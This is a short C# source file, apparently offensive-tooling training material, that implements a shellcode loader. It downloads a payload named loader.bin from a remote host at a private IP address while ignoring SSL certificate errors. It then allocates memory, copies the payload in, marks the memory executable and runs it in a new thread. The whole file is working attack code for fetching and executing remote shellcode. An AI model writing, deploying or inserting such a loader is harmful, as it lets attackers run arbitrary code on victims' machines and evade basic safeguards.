using System;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Threading.Tasks;

namespace CreateThread
{
    internal class Program
    {
        static async Task Main(string[] args)
        {
            byte[] shellcode;

            using (var handler = new HttpClientHandler())
            {
                // Ignore SSL
                handler.ServerCertificateCustomValidationCallback = (message, cert, chain, sslPolicyErrors) => true;

                using (var client = new HttpClient(handler))
                {
                    // Download the shellcode
                    shellcode = await client.GetByteArrayAsync("https://192.168.231.128:9090/loader.bin");
                }
            }

            // Allocate a region of memory in this process as RW
            var baseAddress = Win32.VirtualAlloc(
                IntPtr.Zero,
                (uint)shellcode.Length,
                Win32.AllocationType.Commit | Win32.AllocationType.Reserve,
                Win32.MemoryProtection.ReadWrite);

            // Copy the shellcode into the memory region
            Marshal.Copy(shellcode, 0, baseAddress, shellcode.Length);

            // Change memory region to RX
            Win32.VirtualProtect(
                baseAddress,
                (uint)shellcode.Length,
                Win32.MemoryProtection.ExecuteRead,
                out _);

            // Execute shellcode
            var hThread = Win32.CreateThread(
                IntPtr.Zero,
                0,
                baseAddress,
                IntPtr.Zero,
                0,
                out _);

            // Wait infinitely on this thread to stop the process exiting
            Win32.WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}